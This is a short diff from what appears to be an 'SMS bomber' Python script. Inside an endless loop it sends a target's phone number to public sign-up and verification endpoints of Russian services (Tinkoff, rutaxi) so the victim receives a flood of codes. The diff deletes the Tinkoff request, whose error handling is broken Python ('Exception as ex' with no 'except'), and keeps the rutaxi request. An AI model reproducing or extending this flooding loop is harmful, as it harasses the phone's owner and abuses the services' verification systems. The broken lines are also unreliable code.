@@ -34,12 +34,6 @@ while True:
         _email = _name+f'{iteration}'+'@gmail.com'
         email = _name+f'{iteration}'+'@gmail.com'
         try:
-            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={}) 
-            print('[+] Tinkoff отправлено!') 
-            Exception as ex
-            print('[-] Tinkoff не отправлено!' + str(ex))
- 
-        try:
             requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
         except:
             s=s
